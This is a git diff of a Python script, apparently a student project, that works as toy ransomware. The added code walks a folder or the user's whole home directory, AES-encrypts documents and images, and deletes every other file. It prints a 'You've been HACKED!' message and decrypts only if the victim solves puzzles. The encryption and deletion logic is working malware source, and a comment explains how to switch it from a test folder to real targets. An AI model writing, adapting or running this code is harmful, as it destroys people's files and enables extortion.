@@ -7,7 +7,8 @@ from pprint import pprint
 import sys
 
 def encrypt_file(key, in_filename):
-    out_filename = in_filename + '.enc'
+    out_filename = os.path.splitext(in_filename)[0]
+    out_filename = out_filename + '.enc'
     iv = ''.join(random.choice('0123456789') for n in range(16))
     print(sys.getsizeof(iv[1]))
     encryptor = AES.new(key, AES.MODE_CBC, iv)
@@ -42,7 +43,6 @@ def decrypt_file(key, in_filename):
                 if len(chunk) == 0:
                     break
                 outfile.write(decryptor.decrypt(chunk))
-
             outfile.truncate(origsize)
 
 
@@ -118,27 +118,33 @@ def puzzleThree():
 # Call encryption function here
 
 user_home = pathlib.Path.home()
+# HI! to not cause complete destruction to you system, to just test our code
+# copy the given testfolder into this location
 target_folder = "dev/cs460/finalProject/testFolder"
 start_path = os.path.join(user_home, target_folder)
 print("Running folder scan on " + start_path)
+
+#Now if you're ready for the real thing, uncomment the following lines and comment the ones above!
+# start_path = os.path.join(user_home)
+# print("Running folder scan on " + start_path)
 
 dir_list = []
 file_list = []
 key  = ''.join(random.choice('0123456789abcdef') for n in range(32))
 for root, dirs, files in os.walk(start_path):
     for name in files:
-        # print(os.path.join(root, name))
-        encrypt_file(key, os.path.join(root, name))
+        if(name.lower().endswith(('.txt', '.png', '.jpg', '.docx', '.pdf'))):
+            encrypt_file(key, os.path.join(root, name))
+        if(not(name.lower().endswith('.enc'))):
+            os.remove(os.path.join(root, name))
         file_list.append(os.path.join(root, name))
     for name in dirs:
-        # print(os.path.join(root, name))
-        #encrypt_file(key, os.path.join(root, name))
         dir_list.append(os.path.join(root, name))
 
 print("\nDirectories:")
-print(dir_list)
+#print(dir_list)
 print("\nFolders:")
-pprint(file_list)
+#pprint(file_list)
 
 
 num = 0;
@@ -146,12 +152,15 @@ print("You've been HACKED! \nSoRrY bUt AlL yOuR fIlEs HaVe bEeN eNcRyPtEd. \nIf 
 num = num + puzzleOne()
 if(num == 1):
     num = num + puzzleTwo()
-    if(num == 2):
-        num = num + puzzleThree()
+if(num == 2):
+    num = num + puzzleThree()
 if(num == 3):
-    # for root, dirs, files in os.walk(start_path):
-    #     for name in file_list:
-    #         decrypt_file(key, name)
+    for root, dirs, files in os.walk(start_path):
+        for name in files:
+            if(name.strip().endswith('.enc')):
+                decrypt_file(key, os.path.join(root, name))
+            if(name.lower().endswith('.enc')):
+                os.remove(os.path.join(root, name))
     print("Your files have been decrypted, enjoy your day!\n")
 else:
     print("Sorry, all your files are gone.\n")
